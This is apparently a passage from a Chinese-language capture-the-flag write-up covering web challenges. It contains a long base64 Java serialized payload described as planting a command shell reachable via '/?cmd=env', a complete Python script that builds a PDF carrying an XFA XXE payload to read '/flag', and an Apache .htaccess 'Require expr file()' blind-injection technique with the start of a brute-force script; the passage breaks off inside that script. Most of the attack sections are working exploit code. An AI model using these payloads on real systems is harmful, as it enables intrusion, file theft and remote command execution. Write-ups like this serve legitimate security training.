&quot;configData=rO0ABXcVAA9JbnRlcm5hbE1hbmFnZXIAAAfpc3IAJmNvbS51bmljdGYuY3RmLnRvb2xzLkNvbmZpZ0RhdGFXcmFwcGVyAAAAAYrFIVcCAAZJAAhjaGVja3N1bUoADGxhc3RNb2RpZmllZFsACUNsYXNzQnl0ZXQAAltCTAAIY29uZmlnSWR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhtZXRhZGF0YXQAD0xqYXZhL3V0aWwvTWFwO0wABHNpZ25xAH4AAnhwAAAAAAAAAAAAAAAAdXIAAltCrPMX+AYIVOACAAB4cAAADs01AUVB////y/8j9f/2/6n1/6j/p/X/qP+m9/+l9f+k/6P3/6L4/6H1//j/oPj/n/X/nv+d9f/2/5z3/5v4/5r2/5n/mPf/l/X/mf+W9/+V9/+U9/+T9f/4/5L4/5H1//j/kPX/j/+O9f+P/434/4z3/4v1/4r/ifT/5v+I+P+H9f/i/4b1/57/hff/hPX/8v+D9/+C9/+B9f/y/4D3/3/3/371/33/fPX/8v979/969f/y/3n3/3j3/3f3/3b3/3X1/3T/c/X/dP9y+P9x9f9w/2/1/87/bvf/bfX/zv9s9f/O/2v1/87/avf/aff/aPf/Z/X/Zv9l+P9k+P9j/v/5w5aRlovB/v/819ap/v/7vJCbmv7/8LOWkZqxipKdmo2rnp2Tmv7/8qyLnpyUsp6Pq56dk5r4/2T4/2L4/6H4/5/4/2H4/2D4/5H4/4f+//mWkYmQlJr+/6zXs5WeiZ7Qk56RmNCwnZWanIvEs5WeiZ7Qk56RmNCNmpmTmpyL0LKai5eQm8Sks5WeiZ7Qk56RmNCwnZWanIvE1rOVnome0JOekZjQsJ2VmpyLxPj/X/j/mvj/Xvj/Xfj/cf7/9bqHnJqPi5aQkYz4/1z+//WskIqNnJq5lpOa/v/wr42Qh4asl5qTk9GVnome8//B/8D4/1vz/1r/WfP/WP9X/v/DkI2Y0YyPjZaRmJmNnpKaiJCNlNGImp3RnJCRi5qHi9GNmo6KmoyL0a2ajoqajIu8kJGLmoeLt5CTm5qN+P9i8/9W/1X+/+ecio2NmpGLrZqOipqMi76Li42WnYqLmoz+//CVnome0JOekZjQvJOejIzz/1T/U/7/75WeiZ7Qk56RmNCwnZWanIv4/2Hz/7T/UvP/Uf9Q/v/zmJqLvouLjZadioua/v/vlZ6JntCTnpGY0KyLjZaRmPj/T/P/Tv9N/v/GkI2Y0YyPjZaRmJmNnpKaiJCNlNGImp3RjJqNiZOai9G7loyPnoucl5qNrJqNiZOai9G8sLGruqer8/9M/0v+//iYmou9mp6R/v+tkI2Y0YyPjZaRmJmNnpKaiJCNlNGImp3RjJqNiZOai9GSiZzRkpqLl5Cb0Z6RkZCLnouWkJHRrZqOipqMi7Kej4+WkZi3npGbk5qNsp6Pj5aRmP7/7J6bno+Lmpu2kYuajZyaj4uQjYzz/0r/Sf7/4ZWeiZ7Qk56RmNCxkKyKnJe5lpqTm7qHnJqPi5aQkfP/SP9Q+P9g8/9H/0bz/0X/RP7/8ZWeiZ7QiouWk9CzloyL/v/NkI2Y0YyPjZaRmJmNnpKaiJCNlNGImp3RjJqNiZOai9G3npGbk5qNtpGLmo2cmo+LkI34/0Pz/0L/QfP/QP8//v/slZ6JntCTnpGY0LqHnJqPi5aQkfP/Pv/A8/89/zz+//aPjZq3npGbk5rz/zv/Ov7/85iai6+ejZ6Smouajf7//JySm/P/Of84/v/2mJqLqI2Wi5qN/v/4kIzRkZ6Smvj/N/P/Nv818/80/zz+//yIlpHz/zP/Mv7/+JySm9Gah5r+//3QnP7/+NCdlpHQjJf+//3SnPj/MfP/MP8v8/8u/y3+/+6Vnome0IqLlpPQrJyekZGajfj/XfP/LP8r8//B/yr+//2jvvP/Kf8o8/8n/zjz/yb/PP7///7/+oiNloua/v/6mZOKjJf4/yXz/0z/JP7/9a+NkIeGrJeak5P+/9yVnome0JOekZjQjZqZk5qci9C2kYmQnJ6LlpCRt56Rm5Oajf7/6pWeiZ7Qk56RmNC8k56MjLOQnpuajf7/55WeiZ7Qk56RmNCNmpmTmpyL0LKai5eQm/7/6JWeiZ7Qk56RmNCNmpmTmpyL0LmWmpOb/v/spLOVnome0JOekZjQsJ2VmpyLxP7/7KSzlZ6JntCTnpGY0KyLjZaRmMT+/+6Vnome0JOekZjQr42QnJqMjP7/7JWeiZ7Qk56RmNCrl42QiJ6dk5r+/++Vnome0JOekZjQq5eNmp6b/v/ynIqNjZqRi6uXjZqem/7/69fWs5WeiZ7Qk56RmNCrl42anpvE/v/qmJqLvJCRi5qHi7yTnoyMs5Cem5qN/v/m19azlZ6JntCTnpGY0LyTnoyMs5Cem5qNxP7/9pOQnpu8k56MjP7/2tezlZ6JntCTnpGY0KyLjZaRmMTWs5WeiZ7Qk56RmNC8k56MjMT+//aYmouymouXkJv+/7/Xs5WeiZ7Qk56RmNCsi42WkZjEpLOVnome0JOekZjQvJOejIzE1rOVnome0JOekZjQjZqZk5qci9CymouXkJvE/v/G17OVnome0JOekZjQsJ2VmpyLxKSzlZ6JntCTnpGY0LCdlZqci8TWs5WeiZ7Qk56RmNCwnZWanIvE/v/3mJqLvJOejIz+/+zX1rOVnome0JOekZjQvJOejIzE/v/ulZ6JntCTnpGY0LaRi5qYmo3+//urpq+6/v/us5WeiZ7Qk56RmNC8k56MjMT+//iJnpOKmrCZ/v/p17bWs5WeiZ7Qk56RmNC2kYuamJqNxP7/75iai7uanJOejZqbuZaak5v+/9LXs5WeiZ7Qk56RmNCsi42WkZjE1rOVnome0JOekZjQjZqZk5qci9C5lpqTm8T+//KYmousio+ajZyTnoyM/v/yjJqLvpycmoyMlp2Tmv7/+9el1qn+//yYmov+/9nXs5WeiZ7Qk56RmNCwnZWanIvE1rOVnome0JOekZjQsJ2VmpyLxP7/6JWeiZ7Qk56RmNCNmpmTmpyL0K+NkIeG/v/vkZqIr42Qh4a2kYyLnpGcmv7/ndezlZ6JntCTnpGY0LyTnoyMs5Cem5qNxKSzlZ6JntCTnpGY0LyTnoyMxLOVnome0JOekZjQjZqZk5qci9C2kYmQnJ6LlpCRt56Rm5OajcTWs5WeiZ7Qk56RmNCwnZWanIvE/v/8npub/v/p17azlZ6JntCTnpGY0LCdlZqci8TWqf7/8I+NlpGLrIuenJSrjZ6cmv7/+Jiai7Gekpr+/+vX1rOVnome0JOekZjQrIuNlpGYxP7/+ZqOip6TjP7/6tezlZ6JntCTnpGY0LCdlZqci8TWpf7/+JaMupKPi4b+//zX1qX+/++Vnome0JOekZjQrIaMi5qS/v/0mJqLr42Qj5qNi4b+/9nXs5WeiZ7Qk56RmNCsi42WkZjE1rOVnome0JOekZjQrIuNlpGYxP7/9IuQs5CImo28noya/v/3nJCRi56WkYz+/+TXs5WeiZ7Qk56RmNC8l56NrJqOipqRnJrE1qX+/+6Vnome0JOekZjQrYqRi5aSmv7/9Ziai62KkYuWkpr+/+rX1rOVnome0JOekZjQrYqRi5aSmsT+//uah5qc/v/X16SzlZ6JntCTnpGY0KyLjZaRmMTWs5WeiZ7Qk56RmNCvjZCcmoyMxP7/8Ziai7aRj4qLrIuNmp6S/v/o19azlZ6JntCWkNC2kY+Ki6yLjZqeksT+/+fXs5WeiZ7QlpDQtpGPiousi42anpLE1qn+//OKjJq7mpOWkpaLmo3+/9jXs5WeiZ7Qk56RmNCsi42WkZjE1rOVnome0IqLlpPQrJyekZGajcT+//iXnoyxmoeL/v/7kZqHi/7/7pWeiZ7Qk56RmNC9kJCTmp6R/v/p16XWs5WeiZ7Qk56RmNC9kJCTmp6RxP/e/8P/9v/+/8L////9//7/wf/A//7/v////jr/+f/x////DtVI//5H//1J//yz1O37Sf/6stPt+fxC//hJ//f+/EL/9kn/9bHSSf/07fP6Qv/4pvzt8qym+03/8axJ//fF++b70vpC//am/O3wrKb7/Ef/76xJ//XF+ub6Sf/07e77Qv/4pvzt+KxJ//fF+dTt7Un/+sX45vnm+vtC//am/Ob4rEn/9cX3/sX25vdJ//TF9eb17fZa/+Tm9e3sSf/rxfZY//DF9Ob1Sf/pxfVYABvm9jn/yOb2+0n/6Ob25vdJ/+c//+bF9NTt5Un/+sXz1PtC//im/ObzrNVH/+TF8ub0/ObyRv/j/P9Y//ez1En/4U7//f9o/1//XP/q//v/F/8U/+L//f++////kf/k////9f/7//P/9P/x/+3/8P/a/+//wP/u/6j/7P+T/+v/i//q/3n/6P92/+f/b//m/2j/5P9f/+P/XP/i/1r/4f9T/+D/UP/d/0v/3P9F/9v/Of/Z/zH/2P8h/9b/F//R/xT/0/8T/9L/D//Q/73////B//kA/2//9Pj/vPj/u/j/uvj/ufj/uPj/ufj/uPj/uvj/ufj/t/j/uv//rfj/tvQA/8f//vj/vP//vfj/tfv//v+0/7P//f+////99v/5/+7///7S00n/4MX77d/m+0n/3mb+4dL8zcX60vvNxfnm+kn/9O3d+0L/+Kb87fKsSf/3xfjm+Ob6+0L/9qb87dysSf/1P//yxffm9zn/JOb3Sf/bZf8s5vlJ//Tt2vxC//hJ//fF9ub25vn8Qv/2Sf/1xfXt2Uf/2En/1+3WSf/VZv/m+UL/8qb87dSspvvt06ym+ub3rFj/6flC//Km/O3SrKb77dGspvrm96zF9Ef/0Ob0Sf/PxfNE/86m5vNJ/81I/8zty0n/ysXy5vJJ/8lm//Tm8kn/yFj/+u3HxfHm9Un/9O3G+0L/+Kb87fKsSf/3xfDm8Ob1+0L/9qb85vGsSf/1qOb1Sf/07cX8Qv/4Sf/3xe/m7+b1/EL/9kn/9aj8R//ET1j/+sX4+0f/xE/+T//+/+X+3/7b/+L//f++////pf/p////zP/5/8r/7//J/+r/yP/l/8X/0P/E/7v/wv+u/8H/nv/A/5H/vv9W/7r/TP+5/zn/uP8l/7b/EP+1/v//tP7v/7P+4/+x/t7/rv7b/6/+2f+t/tT/qv+9////nf/3AP9r//T4/7z4/7n4/7j4/7L4/7H4/7n4/7n4/7j4/7H4/7j4/7n//634/7AB/9H4/7D4/6/4/66++P+xAP+3//j4/7z4/7n4/7j4/7L4/7H4/7n4/7n//734/7X+Bv/7/63////7//7/rP/+/6v////9/6p0AAxDT05GLUNURi1FWFBwdAAFcmVhZHk=&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTAxZWIzYmZkOGU4Zjk2ZWQ3YzQ1YTk0NzgwMzA2MGRfMXJRaTloek5ieW9zM2hBU050Y1FaRWFBVUxTak5VUFBfVG9rZW46UE9taGJITjB1b3p3TkR4NE8xTWNsNEhtbkJnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>写入成功  执行shell即可 &#x2F;?cmd&#x3D;env</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzdlYmUzZWI2NzRmYTY4ODUxODg3ZmJlNGVkOTIzNGRfNjJ3N2VWa2tRbDBpMXZyT05oWjlWSjZFcU9rd0w5WDJfVG9rZW46SlpITGJhdEhlb2toUEF4UWxFVmNzdWFSblBkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGE5OTUzYzQzY2VhNGRkODc1YTI2YWMyYWQwODAxNWRfUzd1SFhPc1VIRmR3ZUs4c0QyclpzWWpoOWlLR1dtYnVfVG9rZW46R0IzY2JNSjJxb0xGUHZ4RXdScWNFYzN3bkNmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><strong>XFA (XML Forms Architecture)</strong> 是 PDF 中用来处理动态表单的技术，它的本质是在 PDF 内部嵌入了一段 <strong>XML 数据</strong>。</p>
<p>如果服务端使用 XML 解析器去解析这块 XFA 数据，且未禁用 <strong>外部实体 (External Entities)</strong>，就会引发 <strong>XXE (XML External Entity Injection)</strong> 漏洞。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 配置: 目标文件</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line">TARGET_FILE = <span class="string">&quot;file:///flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># XML Payload: 完整的 XDP 信封结构</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 包含了标准的 xml 头，xdp 命名空间，以及 datasets</span></span><br><span class="line"><span class="comment"># 并尝试在 value 节点中回显文件内容</span></span><br><span class="line">xml_payload = <span class="string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;xfa:datasets xmlns:xfa=&quot;http://www.xfa.org/schema/xfa-data/1.0/&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;xfa:data&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;<span class="subst">&#123;TARGET_FILE&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;form1&gt;</span></span><br><span class="line"><span class="string">&lt;TextField1&gt;[[[ &amp;xxe; ]]]&lt;/TextField1&gt;</span></span><br><span class="line"><span class="string">&lt;/form1&gt;</span></span><br><span class="line"><span class="string">&lt;/xfa:data&gt;</span></span><br><span class="line"><span class="string">&lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">&lt;/xdp:xdp&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_kitchen_sink_pdf</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># PDF Header (必须包含二进制注释以符合规范)</span></span><br><span class="line">    header = <span class="string">b&#x27;%PDF-1.7\n%\xe2\xe3\xcf\xd3\n&#x27;</span></span><br><span class="line">    </span><br><span class="line">    objects = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- Obj 1: Catalog ---</span></span><br><span class="line">    <span class="comment"># 添加 /NeedsRendering true 强制声明这是个 XFA 表单</span></span><br><span class="line">    obj1 = (</span><br><span class="line">        <span class="string">b&#x27;&lt;&lt; /Type /Catalog\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/Pages 2 0 R\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/AcroForm 3 0 R\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/NeedsRendering true\n&#x27;</span> </span><br><span class="line">        <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    objects.append(obj1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- Obj 2: Pages ---</span></span><br><span class="line">    obj2 = (</span><br><span class="line">        <span class="string">b&#x27;&lt;&lt; /Type /Pages\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/Count 1\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/Kids [4 0 R]\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    objects.append(obj2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- Obj 3: AcroForm (核心修改) ---</span></span><br><span class="line">    <span class="comment"># 策略：全覆盖。</span></span><br><span class="line">    <span class="comment"># 我们定义所有常见的 XFA 键：xdp, template, datasets, config, connectionSet</span></span><br><span class="line">    <span class="comment"># 让它们全部指向同一个恶意 XML 流 (Obj 5)</span></span><br><span class="line">    <span class="comment"># 这样无论解析器检查哪个键，都能读取到 Payload</span></span><br><span class="line">    keys = [<span class="string">&quot;/xdp&quot;</span>, <span class="string">&quot;/template&quot;</span>, <span class="string">&quot;/datasets&quot;</span>, <span class="string">&quot;/config&quot;</span>, <span class="string">&quot;/connectionSet&quot;</span>]</span><br><span class="line">    <span class="comment"># 构造数组字符串: /xdp 5 0 R /template 5 0 R ...</span></span><br><span class="line">    xfa_array = <span class="string">&quot; &quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;k&#125;</span> 5 0 R&quot;</span> <span class="keyword">for</span> k <span class="keyword">in</span> keys])</span><br><span class="line">    </span><br><span class="line">    obj3 = (</span><br><span class="line">        <span class="string">b&#x27;&lt;&lt;\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/Fields []\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/XFA [&#x27;</span> + xfa_array.encode() + <span class="string">b&#x27;]\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    objects.append(obj3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- Obj 4: Page (Dummy) ---</span></span><br><span class="line">    obj4 = (</span><br><span class="line">        <span class="string">b&#x27;&lt;&lt; /Type /Page\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/Parent 2 0 R\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;/MediaBox [0 0 612 792]\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    objects.append(obj4)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- Obj 5: XFA Stream (XML Payload) ---</span></span><br><span class="line">    xml_bytes = xml_payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    obj5 = (</span><br><span class="line">        <span class="string">b&#x27;&lt;&lt; /Length &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(xml_bytes)).encode() + <span class="string">b&#x27; &gt;&gt;\n&#x27;</span></span><br><span class="line">        <span class="string">b&#x27;stream\n&#x27;</span> + </span><br><span class="line">        xml_bytes + </span><br><span class="line">        <span class="string">b&#x27;\nendstream&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    objects.append(obj5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 写入文件 (手动计算 XREF) ---</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(header)</span><br><span class="line">        offsets = []</span><br><span class="line">        current_offset = <span class="built_in">len</span>(header)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 写入对象</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(objects):</span><br><span class="line">            obj_id = i + <span class="number">1</span></span><br><span class="line">            offsets.append(current_offset)</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;obj_id&#125;</span> 0 obj\n&quot;</span>.encode())</span><br><span class="line">            f.write(data)</span><br><span class="line">            f.write(<span class="string">b&#x27;\nendobj\n&#x27;</span>)</span><br><span class="line">            current_offset = f.tell()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 写入 XREF 表</span></span><br><span class="line">        xref_start = f.tell()</span><br><span class="line">        f.write(<span class="string">b&#x27;xref\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;0 <span class="subst">&#123;<span class="built_in">len</span>(objects) + <span class="number">1</span>&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">        f.write(<span class="string">b&#x27;0000000000 65535 f \n&#x27;</span>) <span class="comment"># 第0个对象</span></span><br><span class="line">        <span class="keyword">for</span> off <span class="keyword">in</span> offsets:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10&#125;</span> 00000 n \n&quot;</span>.encode())</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Trailer</span></span><br><span class="line">        f.write(<span class="string">b&#x27;trailer\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;&lt;&lt; /Size &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(objects) + <span class="number">1</span>).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;/Root 1 0 R &gt;&gt;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;startxref\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="built_in">str</span>(xref_start).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;%%EOF&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Kitchen Sink PDF generated: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    create_kitchen_sink_pdf(<span class="string">&quot;shell.pdf&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTNhMTExZDc3ZjI3YmFjZDcyNzRmZTJhN2IwZDVmMjFfdjByS0FnWVYwSzB3TFNia20wMGFEUU1EMGV3dHg4ZExfVG9rZW46SEtucWIwbHZXb0RVNmZ4MnV6aGM1SFVvbmZjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>将生成的shell.pdf文件上传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=M2RjMTZjM2UwODlhNDRkMGZkNGY3YWRkZGFiNjY5YWRfY2NISDZsSm5KZ3VxWTF3QmhDdnhKZVc2Wkk1R1hPdVRfVG9rZW46S0thTGJiRHdRb1Iyd1Z4RHIzZmNCaHAwbmlnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a>ezUpload</h3><p>Apache 表达式盲注</p>
<p><strong>Apache</strong> <strong>Expression (ap_expr)</strong> Apache 2.4 引入了强大的表达式语法，可以在 <code>.htaccess</code> 的配置指令中使用（如 <code>SetEnvIfExpr</code>, <code>Require expr</code> 等）。 其中 **<code>file()</code>**<strong>函数</strong>可以任意读取文件内容。</p>
<p>基于 <code>Require expr</code>打布尔盲注</p>
<p>Apache 的访问控制机制：</p>
<ul>
<li><strong>规则</strong>：<code>Require expr &quot;file(&#39;/flag&#39;) =~ /^猜的内容/&quot;</code></li>
<li><strong>如果猜对了</strong>：Apache 允许访问 -&gt; 返回 <strong>200 OK</strong>。</li>
<li><strong>如果猜错了</strong>：Apache 拒绝访问 -&gt; 返回 <strong>403 Forbidden</strong>。</li>
</ul>
<p>.htaccess文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Require expr &quot;file(&#x27;/flag&#x27;) =~ /^&#123;guess&#125;/&quot;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<p>在运行脚本之前，先上传一个 <code>1.txt</code> 文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://80-16850ae8-b715-4b1d-b23a-8391e5055cb0.challenge.ctfplus.cn&quot;</span></span><br><span class="line"><span class="comment"># 必须是一个服务器上已经存在的、且原本能正常访问的文件名！</span></span><br><span class="line"><span class="comment"># 脚本会访问这个文件来判断 200 还是 403</span></span><br><span class="line">target_file_name = <span class="string">&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 